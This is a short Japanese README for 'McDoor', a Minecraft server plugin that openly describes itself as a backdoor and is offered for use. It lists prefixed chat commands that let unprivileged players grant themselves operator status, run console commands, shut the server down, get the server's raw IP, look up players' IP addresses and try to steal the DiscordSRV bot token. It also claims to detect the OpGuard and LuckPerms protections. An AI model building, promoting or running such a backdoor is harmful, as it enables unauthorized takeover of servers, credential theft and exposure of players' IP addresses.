# McDoor - Prefix: `#.`
## McDoorとは?
**McDoor**は、Minecraftサーバーのためのバックドアプラグインです。<br>
非権限者が様々なアクションをこのプラグインから起こすことが出来ます。
## OpGuard & LuckPerms
このプラグインでは、**OpGuard**と**LuckPerms**の検知機能がついています。<br>
この機能がある事により、意味不明なトラブルを最小限に抑える事が出来ます。

# Commands
## 最後にアスタリスク
最後にアスタリスクが付く引数は、必須引数です。
例えば、
`#.gm {GAMEMODE*} {PLAYER NAME}`
であれば、GAMEMODE引数は必須引数で、PLAYER NAMEは任意の引数です。
## List
- `#.op {PLAYER NAME*}` | プレイヤーにオペレーター権限を付与します
- `#.deop {PLAYER NAME*}` | プレイヤーからオペレーター権限をはく奪します
- `#.gm {GAMEMODE*} {PLAYER NAME}` | 自分のゲームモードを設定します
- `#.cmd {COMMAND*}` | コンソールコマンドを実行します
- `#.ip` | サーバーの生IPアドレスの取得を試みます
- `#.plugins` | サーバーのプラグインリストを取得します
- `#.enable {PLUGIN NAME*}` | プラグインを有効にする事を試みます
- `#.disable {PLUGIN NAME*}` | プラグインを無効にする事を試みます
- `#.stop` | サーバーをストップ(シャットダウン)します
- `#.steal` | DiscordSRVに設定されているTokenを盗む事を試みます
- `#.lookup {PLAYER NAME*}` | プレイヤーのIPを取得します
